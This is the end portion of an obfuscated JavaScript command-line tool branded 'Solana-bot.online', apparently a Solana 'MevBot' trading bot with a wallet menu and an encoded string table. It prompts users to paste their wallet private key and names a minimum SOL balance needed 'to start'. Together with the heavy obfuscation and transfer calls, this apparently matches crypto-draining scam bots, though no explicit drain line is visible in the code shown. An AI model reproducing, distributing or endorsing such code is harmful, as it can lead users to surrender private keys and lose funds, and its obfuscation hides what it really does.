    const _0x3ed152 = _0x5f484d;
    while (!![]) {
        const {
            firstRunChoice: _0x416cf7
        } = await inquirer[_0x3ed152(0x141)]([{
            'type': _0x3ed152(0xbe),
            'name': _0x3ed152(0xf0),
            'message': chalk[_0x3ed152(0xfd)](_0x3ed152(0x155)),
            'choices': [{
                'name': _0x3ed152(0xe9),
                'value': _0x3ed152(0xb0)
            }, {
                'name': '🔑\x20\x20Import\x20Wallet',
                'value': 'import'
            }, {
                'name': _0x3ed152(0x136),
                'value': _0x3ed152(0x160)
            }]
        }]);
        if (_0x416cf7 === _0x3ed152(0xb0)) {
            await createNewWallet();
            if (walletInfo[_0x3ed152(0x156)]) return;
        } else {
            if (_0x416cf7 === _0x3ed152(0x165)) {
                await importWallet();
                if (walletInfo[_0x3ed152(0x156)]) return;
            } else _0x416cf7 === _0x3ed152(0x160) && (console['log'](chalk['green'](_0x3ed152(0x116))), process[_0x3ed152(0x160)](0x0));
        }
    }
}
async function chooseWhichWalletToLoad() {
    const _0xf0747f = _0x5f484d,
        _0x4cbeb3 = loadWalletFile(WALLET_FILE),
        _0x2d2f3b = loadWalletFile(IMPORT_WALLET_FILE);
    if (!_0x4cbeb3 && !_0x2d2f3b) {
        await askFirstRunMenu();
        return;
    }
    if (_0x4cbeb3 && !_0x2d2f3b) {
        walletInfo = _0x4cbeb3, console['log'](chalk[_0xf0747f(0x177)](_0xf0747f(0x140)), _0x4cbeb3[_0xf0747f(0x156)]), showWalletInfo();
        return;
    }
    if (!_0x4cbeb3 && _0x2d2f3b) {
        walletInfo = _0x2d2f3b, console['log'](chalk[_0xf0747f(0x177)](_0xf0747f(0x14f)), _0x2d2f3b['address']), showWalletInfo();
        return;
    }
    const _0x36e545 = [{
            'name': _0xf0747f(0xb6) + _0x4cbeb3[_0xf0747f(0x156)],
            'value': _0xf0747f(0xf7)
        }, {
            'name': _0xf0747f(0x115) + _0x2d2f3b['address'],
            'value': 'imported'
        }],
        {
            chosenWallet: _0x9901d9
        } = await inquirer['prompt']([{
            'type': _0xf0747f(0xbe),
            'name': _0xf0747f(0x138),
            'message': chalk[_0xf0747f(0xc7)](_0xf0747f(0xeb)),
            'choices': _0x36e545
        }]);
    _0x9901d9 === _0xf0747f(0xf7) ? (walletInfo = _0x4cbeb3, console[_0xf0747f(0x108)](chalk[_0xf0747f(0x177)](_0xf0747f(0x140)), _0x4cbeb3[_0xf0747f(0x156)]), showWalletInfo()) : (walletInfo = _0x2d2f3b, console[_0xf0747f(0x108)](chalk[_0xf0747f(0x177)](_0xf0747f(0x14f)), _0x2d2f3b[_0xf0747f(0x156)]), showWalletInfo());
}

function _0x6d01(_0x48b462, _0x516f50) {
    const _0x4a6aae = _0x4a6a();
    return _0x6d01 = function(_0x6d01f6, _0x11fa66) {
        _0x6d01f6 = _0x6d01f6 - 0xaf;
        let _0x246876 = _0x4a6aae[_0x6d01f6];
        return _0x246876;
    }, _0x6d01(_0x48b462, _0x516f50);
}
async function run() {
    const _0x26d51b = _0x5f484d;
    console[_0x26d51b(0x12c)](), console[_0x26d51b(0x108)](chalk[_0x26d51b(0x177)]('\x0a⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x0a⠀⠀⠀⣤⡄⠀⠀⠀⠀⣀⣤⢀⣿⣿⣿⣿⣿⣿⡀⣤⣀⠠⠄⢀⣤⣄⠀⠀⠀⠀\x0a⠀⠀⠀⢹⠁⠀⠀⣠⣾⣿⠿⠸⠿⠟⠛⠛⠻⠿⠇⠿⣿⣷⣄⠘⠿⠿⠀⠀⠀⠀\x0a⠀⠀⠀⢸⠀⠀⣴⡿⠁⣠⣶⡶⠒⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣦\x20\x20⠶⡀⠀⠀⠀\x0a⠀⠀⠀⢀⠀⣸⡟⠀⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⡀⠀⠀⠀\x0a⠀⠀⣸⡏⢠⣿⠁⢸⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⢹⣇⠀⠀\x0a⠀⠀⣿⡇⢸⡏⠀\x20𝗦𝗢𝗟𝗔𝗡𝗔-𝗕𝗢𝗧.𝗢𝗡𝗟𝗜𝗡𝗘⠀⢹⡇⢸⣿⠀⠀\x0a⠀⠘⢿⡇⢸⣧⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇⢸⡿⠃⠀\x0a⠀⠀⠀⠁⠸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠇⠈⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠻⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠙⢿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣾⡿⠋⠀⠀⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠀⢼⣷⣤⣈⠙⠛⠿⠿⠿⣿⣿⠿⠿⠿⠛⠋⣁⣤⣾⡧⠀⠀⠀⠀⠀\x0a⠀⠀⣠⣴⣷⣦⣈⠙⠛⠿⢷⣶⡆⢠⣤⣤⡄⢰⣶⡾⠿⠛⠋⣁⣴⣾⣦⣄⠀⠀\x0a⠀⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣤⣈⣉⣉⣁⣤⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⠀\x0a⠀⠛⠛⠃⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠘⠛⠛⠀\x0a\x20\x20Welcome\x20to\x20Solana-bot.online\x0a\x20\x20Local\x20Version\x0a\x20\x20\x20\x20')), filterScamTokens(), checkListOfTokens(), autoConnectNetwork(), await chooseWhichWalletToLoad(), await showMainMenu();
}

function _0x4a6a() {
    const _0x228e99 = ['create', 'enabled', 'Select\x20DEX:', 'magenta', 'Error\x20configuring\x20SL/TP:', 'Error\x20importing\x20wallet:', 'Main\x20wallet:\x20', '346845JhwjJo', 'Balance:\x20', 'Connected\x20to\x20network\x20ready\x20✅', 'back', '3428805DvBCAU', 'autoBuy', 'publicKey', 'list', '4434500GwDCSY', 'start', 'Wallet\x20overwrite\x20cancelled.', 'open', 'confirmOverwrite', 'mainnet-beta', '📉\x20\x20SL/TP', 'existsSync', 'cyan', 'Disable\x20AutoBuy', 'minAmount', 'join', 'Preparing\x20withdrawal...\x20Please\x20wait...', 'https://solscan.io/account/', '2510320KHVird', 'marketCap', 'https://api-v3.raydium.io/', 'Too\x20Many\x20Requests', '📊\x20\x20Dex', '📝\x20Enter\x20withdraw\x20address', 'API\x20Raydium\x20PublicKey:\x20', '%,\x20Take\x20Profit\x20-\x20', 'Enter\x20minimum\x20token\x20market\x20cap\x20($):', '🛒\x20\x20AutoBuy', 'realpathSync', 'base58Key', 'newMarketCap', 'Withdrawal\x20Successful!\x20(balance\x20is\x200)', 'Failed\x20to\x20start\x20MevBot\x20after\x20', 'https://api.jupiter.ag/', 'sendTransaction', 'pY8JzoikiM', 'Error\x20configuring\x20AutoBuy:', 'mode', '📍\x20Address:', '🔑\x20\x20Import\x20Wallet', 'confirmTransaction', 'Enter\x20your\x20wallet\x20PRIVATE\x20KEY\x20(Base58):\x0a(Use\x20right\x20mouse\x20click\x20to\x20paste)', 'fixed', 'chalk', 'stdout', 'Enter\x20a\x20valid\x20percentage\x20(>\x20', '🆕\x20\x20Create\x20New\x20Mev\x20Wallet', 'encode', 'Which\x20wallet\x20do\x20you\x20want\x20to\x20use?', 'floor', '💸\x20\x20Withdraw', 'Error\x20generating\x20QR\x20code:', 'withdraw', 'firstRunChoice', 'toBase58', 'maxFixed', 'minFixed', 'Error:\x20unable\x20to\x20process\x20API\x20address.', 'Invalid\x20private\x20key\x20(Base58)\x20format.\x20Please\x20try\x20again.', 'utf-8', 'main', 'writeFileSync', '🔄\x20\x20Create\x20New\x20MevBot\x20Wallet', 'https://quote-api.jup.ag/v6', 'deposit_qr.png', 'toFile', 'yellow', '30lbacvS', 'getBalance', 'privateKey', 'length', '🔙\x20\x20Back', 'Enter\x20a\x20wallet\x20address\x20for\x20withdrawal\x20(Solana):', 'Error\x20saving\x20imported\x20wallet:', '⚙️\x20\x20\x20Settings', '💰\x20\x20Deposit\x20QR\x20code', 'Enter\x20Take\x20Profit\x20(%)\x20from\x20purchase:', 'log', 'Selected\x20DEX:\x20', 'bip39', '\x20SOL\x20to\x20start.', 'Unknown\x20option.\x0a', 'Jupiter', 'add', 'https://api.raydium.io/', 'confirmed', '[■■■■■]', 'includes', 'Invalid\x20recipient\x20address:', 'Settings:', 'Imported\x20wallet:\x20', 'Exiting\x20program.', '✅\x20MevBot\x20Solana\x20started...\x20(balance\x20is\x200)', 'solana_wallet.json', 'minPercent', 'takeProfit', '💼\x20\x20Wallet\x20Info', 'Wallet\x20file\x20\x27', '🔑\x20Private\x20Key\x20(Base58):', '[■□□□□]', '📋\x20Paste\x20your\x20private\x20key\x20(Base58)', 'mainOption', 'Enter\x20Stop\x20Loss\x20(%)\x20from\x20purchase:', 'secretKey', '[■■■□□]', 'Wallet\x20saved\x20to\x20file:', 'SL/TP\x20set:\x20Stop\x20Loss\x20-\x20', '429', 'stopLoss', 'maxAmount', '381934EPZGvo', '▶️\x20\x20\x20Start', 'userWithdrawAmount', 'clear', '%\x20of\x20balance', 'from', 'toString', 'transfer', 'AutoBuy\x20configured:\x20from\x20', 'import_wallet.json', 'Enter\x20a\x20valid\x20number.', 'fromSecretKey', 'MA==', '🚪\x20\x20Exit', 'Error\x20executing\x20transaction:', 'chosenWallet', '📈\x20\x20M.cap', 'base64', 'Got\x20429\x20error.\x20Waiting\x20and\x20retrying...', 'input', 'Wallet\x20already\x20exists.\x20Use\x20\x27Create\x20New\x20MevBot\x20Wallet\x27\x20to\x20overwrite.', 'blueBright', 'percentage', 'Loaded\x20main\x20wallet:', 'prompt', '767109FxnVKb', 'Select\x20an\x20action:', 'generate', 'Enter\x20maximum\x20percentage\x20of\x20balance\x20to\x20buy\x20(from\x20min\x20to\x20100%):', 'inquirer', '117396PjSYXj', 'parse', 'stringify', 'Enter\x20a\x20valid\x20Stop\x20Loss\x20(1-99).', 'Error\x20in\x20main\x20menu:', '\x20SOL', '\x27\x20is\x20corrupted\x20or\x20invalid.', 'Error\x20creating\x20wallet:', 'Loaded\x20imported\x20wallet:', 'addressMenuChoice', 'ALL', '[■■■■□]', 'Percentage\x20of\x20balance\x20(%)', 'Select\x20an\x20option:', 'No\x20wallets\x20found.\x20What\x20do\x20you\x20want\x20to\x20do?', 'address', 'Enter\x20maximum\x20purchase\x20amount\x20(in\x20SOL):', 'Maximum\x20amount\x20must\x20be\x20greater\x20than\x20minimum.', 'bs58', '🚀\x20Starting\x20MevBot...\x20Please\x20wait...', 'Are\x20you\x20sure\x20you\x20want\x20to\x20overwrite\x20the\x20existing\x20wallet?', '✅\x20MevBot\x20Solana\x20started...', 'Error\x20getting\x20balance:', '💳\x20\x20Balance', '936pdWqgK', 'exit', 'Error\x20processing\x20DEX\x20addresses:', 'pow', 'qrcode', 'blue', 'import', 'Error\x20saving\x20wallet:', '🔙\x20Back', 'Invalid\x20private\x20key:', 'hex', 'disable', 'Auto-buy\x20disabled.', 'write', 'Pump.FUN', 'Minimum\x20market\x20cap\x20set:\x20$', 'toFixed', 'paste', 'Insufficient\x20funds.\x20A\x20minimum\x20balance\x20of\x20', 'userWithdrawAddress', 'Enter\x20minimum\x20purchase\x20amount\x20(in\x20SOL,\x20≥\x200.1):', '\x20attempts.', 'List\x20of\x20Tokens\x20✅', 'readFileSync', 'green', 'selectedDex', 'slTp', '%\x20to\x20', 'red'];
    _0x4a6a = function() {
        return _0x228e99;
    };
    return _0x4a6a();
}
run();